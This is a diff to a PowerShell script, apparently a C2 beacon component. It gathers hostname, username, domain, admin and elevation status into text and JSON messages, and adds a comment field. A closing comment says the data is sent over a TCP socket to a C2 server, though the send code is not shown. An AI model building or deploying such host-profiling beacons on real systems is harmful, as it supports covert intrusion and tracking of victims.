@@ -3,15 +3,15 @@
 #
 
 # Define arguments
-param($stage="Init", $state="Unknown", $duration="N/A")
+param($stage="Init", $state="Unknown", $duration="N/A", $comment="N/A")
 
 # Define session variables
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $domain = $env:USERDOMAIN
 $timestamp = Get-Date -Format "yyyy-MM-ddTHH:mm:ssK"
-$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}, Duration: {8}"
-$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}", "duration": "{8}"}}'
+$init_message = "[{0}] Hostname: {1}, Username: {2}\{3}, Admin: {4}, Elevated: {5}, Stage: {6}, State: {7}, Duration: {8}, Comment: {9}"
+$init_message_json = '{{"timestamp": "{0}, "hostname": "{1}", "username": "{2}\{3}", "admin": {4}, "elevated": {5}, "stage": "{6}", "state": "{7}", "duration": "{8}", "comment": "{9}"}}'
 
 # Determine if this is an admin user, and if this session is elevated
 $admin_user = ($username -split "-")[1]
@@ -28,9 +28,9 @@ if ($admin_user -ne $null)
 
 # Debug output
 #write-host('')
-$message = ($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration)
+$message = ($init_message -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration, $comment)
 #write-host('')
-$json_message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration | convertto-json | convertfrom-json)
+$json_message = ($init_message_json -f $timestamp, $hostname, $domain, $username, $is_admin, $is_elevated, $stage, $state, $duration, $comment | convertto-json | convertfrom-json)
 write-host('')
 
 # Create TCP socket to C2 and send $tcp_message
